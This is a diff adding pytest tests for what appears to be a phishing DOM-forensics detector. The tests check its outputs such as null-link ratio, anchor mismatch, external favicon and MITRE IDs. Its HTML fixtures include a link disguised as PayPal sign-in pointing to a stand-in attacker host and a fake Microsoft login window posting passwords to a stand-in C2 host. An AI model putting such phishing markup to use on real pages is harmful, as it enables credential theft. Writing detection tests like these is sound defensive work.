@@ -149,3 +149,93 @@ def test_dom_forensics_shadow_dom_detection():
     assert res.has_shadow_dom_nodes is True
     assert "T1027" in res.mitre_attack_id
 
+
+def test_dom_forensics_hyperlinks_and_anchor_discrepancy():
+    html = """
+    <html>
+    <body>
+        <a href="#">Dead Link 1</a>
+        <a href="javascript:void(0);">Dead Link 2</a>
+        <a href="http://external-attacker.xyz/steal">https://www.paypal.com/signin</a>
+        <a href="/internal/help">Help</a>
+    </body>
+    </html>
+    """
+    res = extract_dom_deep_forensics(
+        dom_html=html,
+        candidate_url="http://fake-paypal-login.xyz",
+        canonical_domains=["paypal.com", "www.paypal.com"]
+    )
+    assert res.total_hyperlinks_count == 4
+    assert res.null_hyperlinks_ratio == 0.50  # 2 out of 4 are null
+    assert res.anchor_text_discrepancy_count >= 1
+    assert "T1566.002" in res.mitre_attack_id
+
+
+def test_dom_forensics_cantina_resource_ratio():
+    html = """
+    <html>
+    <head>
+        <link rel="icon" href="https://external-cdn-spoof.com/favicon.ico" />
+        <link rel="stylesheet" href="https://external-cdn-spoof.com/style.css" />
+    </head>
+    <body>
+        <img src="https://external-cdn-spoof.com/logo.png" />
+        <img src="/local/icon.png" />
+    </body>
+    </html>
+    """
+    res = extract_dom_deep_forensics(
+        dom_html=html,
+        candidate_url="http://phish-site.xyz"
+    )
+    assert res.external_resources_ratio >= 0.50
+    assert res.favicon_external_mismatch is True
+
+
+def test_dom_forensics_server_form_handler():
+    html = """
+    <html>
+    <body>
+        <form action="#" method="POST">
+            <input type="password" name="pwd" />
+            <button type="submit">Login</button>
+        </form>
+    </body>
+    </html>
+    """
+    res = extract_dom_deep_forensics(
+        dom_html=html,
+        candidate_url="http://fake-portal.xyz"
+    )
+    assert res.has_server_form_handler_mismatch is True
+
+
+def test_dom_forensics_anti_analysis_and_bitb():
+    html = """
+    <html>
+    <body oncontextmenu="return false;" onselectstart="return false;">
+        <div class="browser-window">
+            <div class="window-controls">
+                <span class="close"></span>
+            </div>
+            <div class="fake-address-bar">
+                https://login.microsoftonline.com/oauth2/authorize
+            </div>
+            <form action="http://c2-steal.xyz/post" method="POST">
+                <input type="password" name="password" />
+            </form>
+        </div>
+    </body>
+    </html>
+    """
+    res = extract_dom_deep_forensics(
+        dom_html=html,
+        candidate_url="http://bitb-attack.xyz"
+    )
+    assert res.has_right_click_disabled is True
+    assert res.has_text_selection_disabled is True
+    assert res.has_browser_in_the_browser is True
+    assert "T1185" in res.mitre_attack_id
+
+
